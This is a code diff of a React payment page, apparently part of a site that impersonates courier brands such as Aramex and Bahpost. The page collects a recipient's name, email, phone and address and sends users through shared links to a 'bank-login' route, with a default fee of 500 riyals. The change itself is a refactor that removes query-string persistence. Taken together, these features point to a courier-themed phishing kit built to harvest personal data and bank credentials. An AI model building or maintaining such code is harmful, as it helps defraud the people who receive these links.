@@ -27,14 +27,14 @@ import heroBahpost from "@/assets/hero-bahpost.jpg";
 import heroBg from "@/assets/hero-bg.jpg";
 
 const PaymentRecipient = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading } = useLink(shareId);
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlService = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -64,14 +64,6 @@ const PaymentRecipient = () => {
   const shippingInfo = payload;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  const persistedSearch = useMemo(() => {
-    const params = new URLSearchParams(initialSearch || "");
-    if (serviceKey) {
-      params.set('service', serviceKey);
-    }
-    const search = params.toString();
-    return search ? `?${search}` : "";
-  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
@@ -82,9 +74,9 @@ const PaymentRecipient = () => {
   useEffect(() => {
     const method = sessionStorage.getItem('paymentMethod');
     if (!method) {
-      navigate(`/pay/${id}/track${persistedSearch}`, { replace: true });
+      navigate(`/pay/${shareId}/track`, { replace: true });
     }
-  }, [id, navigate, persistedSearch]);
+  }, [shareId, navigate]);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -143,7 +135,7 @@ const PaymentRecipient = () => {
         service: serviceName,
         service_key: serviceKey,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details${persistedSearch}`
+        payment_url: `${window.location.origin}/pay/${shareId}/details`
       },
       timestamp: new Date().toISOString()
     });
@@ -169,13 +161,13 @@ const PaymentRecipient = () => {
       const bank = sessionStorage.getItem('selectedBank');
       if (!bank || bank === 'skipped') {
         sessionStorage.removeItem('selectedBank');
-        navigate(`/pay/${id}/track${persistedSearch}`);
+        navigate(`/pay/${shareId}/track`);
         return;
       }
-      navigate(`/pay/${id}/bank-login${persistedSearch}`);
+      navigate(`/pay/${shareId}/bank-login`);
     } else {
       sessionStorage.setItem('selectedBank', 'skipped');
-      navigate(`/pay/${id}/details${persistedSearch}`);
+      navigate(`/pay/${shareId}/details`);
     }
   };
   
